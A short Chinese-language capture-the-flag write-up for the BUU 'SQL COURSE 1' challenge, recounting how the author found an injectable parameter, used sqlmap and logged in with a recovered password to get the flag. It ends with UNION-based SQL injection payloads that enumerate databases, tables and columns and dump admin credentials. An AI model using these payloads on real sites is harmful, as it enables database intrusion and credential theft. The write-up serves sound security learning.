## BUU SQL COURSE 1

首先我们进入页面发现有==热点==和==登录== 两个入口，我简单的看了看热点中的三个页面，发现没什么，由于是sql题我想着会在登录口提供注入，测试了半天发现没什么响应，于是我回到热点页面寻找一些提示

正常手段没有什么发现，于是我选择抓包尝试

![image-20240815102913873](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815102913873.png)

发现这里可能是一个注入口，于是我开始尝试

测试了几个数据发现是有效注入，这里我才用`sqlmap`

![image-20240815105033629](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815105033629.png)

发现了登录密码，我这里登录一下试试

759acef6268110172281c9824641399e

得到flag

```
flag{62e98eae-c31c-422a-b0ba-469e84ef2717}
```



### 网上Wp学习

```
暴库：（information_schema,ctftraining,mysql,performance_schema,test,news）
?id=-1 UNION SELECT 1,group_concat(schema_name) from information_schema.schemata

暴表：（admin,contents）
?id=-1 UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema="news"

暴字段：（id,username,password）
?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name="admin"

暴密码：(983a3f6bc1f3709f9f8997f887ef9803)
?id=-1 UNION SELECT 1,concat(username,0x3a,password) from admin
```

